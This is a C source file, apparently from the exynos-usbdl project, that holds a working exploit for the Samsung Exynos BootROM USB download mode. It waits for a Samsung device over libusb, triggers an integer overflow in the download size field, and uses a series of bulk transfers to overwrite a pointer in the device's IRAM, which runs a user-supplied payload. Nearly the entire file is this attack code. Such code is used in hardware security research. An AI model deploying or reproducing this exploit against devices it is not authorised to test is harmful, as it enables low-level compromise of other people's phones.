/* -*- Mode: C; indent-tabs-mode:t ; c-basic-offset:8 -*- */
/* exynos-usbdl - github.com/frederic/exynos-usbdl
 * 
 * based on the following examples from libusb.info :
 * Test suite program based of libusb-0.1-compat testlibusb
 * libusb example program for hotplug API
 * Copyright © 2012-2013 Nathan Hjelm <hjelmn@mac.com>
 *
 * This library is free software; you can redistribute it and/or
 * modify it under the terms of the GNU Lesser General Public
 * License as published by the Free Software Foundation; either
 * version 2.1 of the License, or (at your option) any later version.
 *
 * This library is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 * Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public
 * License along with this library; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA
 */

#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include "libusb-1.0/libusb.h"

#define DEBUG	1

#define VENDOR_ID	0x04e8
#define PRODUCT_ID	0x1234
#define BLOCK_SIZE		512
#define CHUNK_SIZE	(uint32_t)0xfffe00

int done = 0;
libusb_device_handle *handle = NULL;

#define MAX_PAYLOAD_SIZE	(BLOCK_SIZE - 10)//TODO bug, we should be able to reach 0xffff
typedef struct __attribute__ ((__packed__)) dldata_s {
	u_int32_t unk0;
	u_int32_t size;// header(8) + data(n) + footer(2)
	u_int8_t data[MAX_PAYLOAD_SIZE];
	u_int16_t unk1;
} dldata_t;

static int exploit(dldata_t *payload) {
	int rc;
	int transferred;
	uint32_t block_count, size_block_aligned;
	uint32_t skip_cnt = 0x100;//first, we transfer enough CHUNK_SIZE to reach @0x02001800
	//then we calculate how many BLOCK_SIZE are required to reach 0x02020F08
	block_count = (0x02020F08 - (0x02001800 + payload->size - 8)) / BLOCK_SIZE;//0xfa
	//only remaining bytes will be written
	uint32_t remain = (0x02020F08 - (0x02001800 + payload->size - 8)) % BLOCK_SIZE;//0x110
	//todo handle block-aligned case
	printf("block_count=0x%x\n", block_count);
	printf("remain=0x%x\n", remain);
	uint32_t iram_offset = BLOCK_SIZE * block_count;
	uint32_t iram_size = remain + 4 + 2;//overwritten pointer size + footer
	uint8_t *iram = (uint8_t*)calloc(1, iram_size);
	iram[remain] = 0xe0;
	iram[remain+1] = 0x64;
	iram[remain+2] = 0x00;
	iram[remain+3] = 0x00;

	iram[remain] = 0x00;
	iram[remain+1] = 0x18;
	iram[remain+2] = 0x02;
	iram[remain+3] = 0x02;
	 
	uint32_t xfer_buffer = 0x02021800;
	uint32_t usb_size;
#if DEBUG
	printf("exploit: begin\n");
	printf("CHUNK_SIZE * skip_cnt=0x%x\n", CHUNK_SIZE * skip_cnt);
	printf("skip_cnt=0x%x\n", skip_cnt);
	printf("payload->size=0x%x\n", payload->size);
	printf("sizeof(iram)=0x%lx\n", sizeof(iram));
	printf("iram_offset=0x%x\n", iram_offset);
#endif
	size_t first_chunk_size = payload->size;
	printf("first_chunk_size=0x%lx\n", first_chunk_size);
	//trigger integer overflow vulnerability
	payload->size = payload->size + (CHUNK_SIZE * skip_cnt) + iram_offset +iram_size;
	printf("payload->size=0x%x\n", payload->size);

	rc = libusb_claim_interface(handle, 0);
	if(rc) {
		fprintf(stderr, "Error claiming interface: %s\n", libusb_error_name(rc));
		return rc;
	}

	rc = libusb_bulk_transfer(handle, LIBUSB_ENDPOINT_OUT | 2, (uint8_t*)payload, first_chunk_size, &transferred, 0);
	if(rc) {
		printf("libusb_bulk_transfer LIBUSB_ENDPOINT_OUT: error %d\n", rc);
		fprintf(stderr, "Error libusb_bulk_transfer: %s\n", libusb_error_name(rc));
		return rc;
	}
	xfer_buffer += CHUNK_SIZE + (transferred - 8);
	printf("xfer_buffer=0x%x\n", xfer_buffer);
	usb_size = (payload->size - transferred) - CHUNK_SIZE;
	printf("usb_size=0x%x\n", usb_size);
	//that initial bulk transfer has already increased xfer_buffer by CHUNK_SIZE one time.
	printf("libusb_bulk_transfer: transferred=%d\n", transferred);
	while(skip_cnt--){
		rc = libusb_bulk_transfer(handle, LIBUSB_ENDPOINT_OUT | 2, iram, 0, &transferred, 0);
		if(rc) {
			printf("libusb_bulk_transfer LIBUSB_ENDPOINT_OUT: error %d\n", rc);
			fprintf(stderr, "Error libusb_bulk_transfer: %s\n", libusb_error_name(rc));
			return rc;
		}
		printf("libusb_bulk_transfer: transferred=%d\n", transferred);
		printf("skip_cnt=0x%x\n", skip_cnt);
		if(usb_size > CHUNK_SIZE){
			xfer_buffer += CHUNK_SIZE;
			printf("xfer_buffer=0x%x\n", xfer_buffer);
			usb_size -= CHUNK_SIZE;
			printf("usb_size=0x%x\n", usb_size);
		}else{
			block_count = 0;
			if(BLOCK_SIZE != 0){
					block_count = usb_size / BLOCK_SIZE;
			}
			size_block_aligned = block_count * BLOCK_SIZE;
			usb_size = usb_size - (BLOCK_SIZE * block_count);
			if(usb_size == 0) {
				size_block_aligned = size_block_aligned - BLOCK_SIZE;
				usb_size = BLOCK_SIZE;
			}
			if(size_block_aligned == 0)
				printf("ERROR !! size_block_aligned == 0 , CANT WORK!!\n");
			printf("size_block_aligned=0x%x\n", size_block_aligned);
			xfer_buffer += size_block_aligned;
			printf("xfer_buffer=0x%x\n", xfer_buffer);
			printf("usb_size=0x%x\n", usb_size);
		}
	}
	
	//dummy transfer in usb_finish_download
	rc = libusb_bulk_transfer(handle, LIBUSB_ENDPOINT_OUT | 2, iram, 0, &transferred, 0);
	if(rc) {
		printf("libusb_bulk_transfer LIBUSB_ENDPOINT_OUT: error %d\n", rc);
		fprintf(stderr, "Error libusb_bulk_transfer: %s\n", libusb_error_name(rc));
		return rc;
	}
	printf("libusb_bulk_transfer: transferred=%d\n", transferred);

	//todo last two bytes not overwritten due to ignored footer
	rc = libusb_bulk_transfer(handle, LIBUSB_ENDPOINT_OUT | 2, iram, iram_size, &transferred, 0);
	if(rc) {
		printf("libusb_bulk_transfer LIBUSB_ENDPOINT_OUT: error %d\n", rc);
		fprintf(stderr, "Error libusb_bulk_transfer: %s\n", libusb_error_name(rc));
		return rc;
	}
	printf("libusb_bulk_transfer: transferred=%d\n", transferred);

	sleep(5);
	libusb_release_interface(handle, 0);

	return rc;
}

static int LIBUSB_CALL hotplug_callback(libusb_context *ctx, libusb_device *dev, libusb_hotplug_event event, void *user_data)
{
	struct libusb_device_descriptor desc;
	int rc;

	rc = libusb_get_device_descriptor(dev, &desc);
	if (LIBUSB_SUCCESS != rc) {
		fprintf (stderr, "Error getting device descriptor\n");
	}

	printf ("Device attached: %04x:%04x\n", desc.idVendor, desc.idProduct);

	if (handle) {
		libusb_close (handle);
		handle = NULL;
	}

	rc = libusb_open (dev, &handle);
	if (LIBUSB_SUCCESS != rc) {
		fprintf (stderr, "Error opening device\n");
	}
	done++;

	return 0;
}

static int LIBUSB_CALL hotplug_callback_detach(libusb_context *ctx, libusb_device *dev, libusb_hotplug_event event, void *user_data)
{
	printf ("Device detached\n");

	if (handle) {
		libusb_close (handle);
		handle = NULL;
	}

	done++;

	return 0;
}

int main(int argc, char *argv[])
{
	libusb_context *ctx;
	libusb_hotplug_callback_handle hp[2];
	FILE *fd;
	dldata_t payload = {0};
	size_t result, fd_size;
	int rc;

	if (argc != 2) {
		printf("Usage: %s <input_file>\n", argv[0]);
		exit(-1);
	}

	fd = fopen(argv[1],"rb+");
	if (fd == NULL) {
		perror("Can't open input file !\n");
		exit(-1);
	}

	fseek(fd, 0, SEEK_END);
	fd_size = ftell(fd);
	if(fd_size > MAX_PAYLOAD_SIZE){
		printf("Error: input file size cannot exceed %u bytes !\n", MAX_PAYLOAD_SIZE);
		exit(-1);
	}

	payload.size = sizeof(dldata_t);

	fseek(fd, 0, SEEK_SET);
	result = fread(&payload.data, 1, fd_size, fd);
	if (result != fd_size) {
		printf("Error: cannot read entire file !\n");
		exit(-1);
	}

	rc = libusb_init (&ctx);
	if (rc < 0)
	{
		printf("failed to initialise libusb: %s\n", libusb_error_name(rc));
		return EXIT_FAILURE;
	}

	libusb_set_debug(ctx, LIBUSB_LOG_LEVEL_DEBUG);

	if (!libusb_has_capability (LIBUSB_CAP_HAS_HOTPLUG)) {
		printf ("Hotplug capabilites are not supported on this platform\n");
		libusb_exit (NULL);
		return EXIT_FAILURE;
	}

	rc = libusb_hotplug_register_callback (NULL, LIBUSB_HOTPLUG_EVENT_DEVICE_ARRIVED, 0, VENDOR_ID,
		PRODUCT_ID, LIBUSB_HOTPLUG_MATCH_ANY, hotplug_callback, NULL, &hp[0]);
	if (LIBUSB_SUCCESS != rc) {
		fprintf (stderr, "Error registering callback 0\n");
		libusb_exit (NULL);
		return EXIT_FAILURE;
	}

	rc = libusb_hotplug_register_callback (NULL, LIBUSB_HOTPLUG_EVENT_DEVICE_LEFT, 0, VENDOR_ID,
		PRODUCT_ID,LIBUSB_HOTPLUG_MATCH_ANY, hotplug_callback_detach, NULL, &hp[1]);
	if (LIBUSB_SUCCESS != rc) {
		fprintf (stderr, "Error registering callback 1\n");
		libusb_exit (NULL);
		return EXIT_FAILURE;
	}

	printf("<Waiting for device %04x:%04x>\n", VENDOR_ID, PRODUCT_ID);

	while (done < 1) {
		rc = libusb_handle_events (NULL);
		if (rc < 0)
			printf("libusb_handle_events() failed: %s\n", libusb_error_name(rc));
	}

	exploit(&payload);

	if (handle) {
		libusb_close (handle);
	}

	libusb_exit (NULL);

	return EXIT_SUCCESS;
}
